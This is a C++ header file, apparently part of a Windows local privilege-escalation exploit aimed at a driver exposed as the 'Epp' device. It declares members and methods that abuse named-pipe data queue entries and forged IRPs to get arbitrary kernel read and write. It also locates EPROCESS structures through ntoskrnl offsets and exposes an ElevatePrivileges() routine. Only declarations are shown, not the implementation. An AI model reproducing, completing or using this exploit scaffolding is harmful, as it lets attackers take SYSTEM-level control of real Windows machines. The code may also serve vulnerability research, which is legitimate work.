#pragma once
#include <windows.h>
#include <winternl.h>
#include "Utils.h"
#include "NtoskrnlOffsetFinder.h"

class Epp
{
	//Handle to Epp device
	HANDLE DeviceHandle = NULL;

	bool IsArbitraryReadSetupped = false;
	bool IsArbitraryWriteSetupped = false;

	//Pipe which has one of its data queue entries in user mode address space
	HANDLE VulnerablePipe = INVALID_HANDLE_VALUE;

	//Offset in data in vulnerable pipe at which is data of controlled data queue entry
	UINT64 OffsetOfData = 0;

	//List entry of UserDataQueue
	LIST_ENTRY ListEntryOfUserDataQueue{ 0 };

	//Data queue entry which is in user address space and belongs VulnerablePipe
	DATA_QUEUE_ENTRY* UserDataQueue = nullptr;

	//Used to arbitrary read
	IRP* ArbitraryReadIrp = nullptr;

	void* CcbWithForgedIrps = nullptr;

	//Pipe which holds forged irps
	HANDLE PipeWithForgedIrps = INVALID_HANDLE_VALUE;

	UINT64 SizeOfForgedIrp = 0;
	//Irp used to arbitrary write
	IRP* ForgedIrp = nullptr;

	//Used to find current eprocess and system eprocess
	void* SomeEprocess = nullptr;

	NtoskrnlOffsetFinder OffsetFinder;

	bool SetupArbitraryRead();
	bool SetupArbitraryWrite();

	bool ArbitraryRead(void* AddressToReadFrom, void* Destination, UINT64 BytesToRead);
	bool ArbitraryWrite(void* AddressToWrite, void* Source, UINT64 BytesToWrite);

	void* GetEprocessAddressByPid(DWORD ProcessId);

	void FindCcbWithDataQueue(void* Ccb, void* FlinkOfFirstDataQueue, void** OutCcb, void** OutDataQueueEntry);
public:
	Epp();
	bool ElevatePrivileges();

	//Returns true if arbitrary read and write are setupped
	const bool GetIsSetupped();
};